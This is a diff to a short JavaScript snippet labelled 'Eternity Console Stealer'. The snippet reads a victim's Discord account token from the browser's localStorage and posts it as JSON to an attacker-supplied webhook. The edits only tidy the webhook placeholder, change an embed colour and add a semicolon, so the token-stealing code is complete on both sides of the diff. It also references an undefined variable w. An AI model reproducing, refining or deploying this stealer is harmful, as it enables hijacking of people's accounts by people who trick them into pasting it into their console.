@@ -15,19 +15,19 @@
 (function() {
     window.dispatchEvent(new Event('beforeunload'));
     var x = new XMLHttpRequest;
-    x.open("POST", 'YOUR **WEBHOOK**'), x.setRequestHeader("Content-type", "application/json");
+    x.open("POST", 'YOUR WEBHOOK'), x.setRequestHeader("Content-type", "application/json");
     var y = {
         username: "Eternity Console Stealer",
         avatar_url: "https://cdn.discordapp.com/attachments/941755353035579422/947642580521340928/1.png",
         content: "@everyone New Log!",
         embeds: [{
-            color: "#8800ff",
+            color: "21426",
             description: `Token: ${window.open().localStorage.token}`,
         }]
     };
 
     x.send(JSON.stringify(y));
     w.close()
-}());
+}());;
 
 
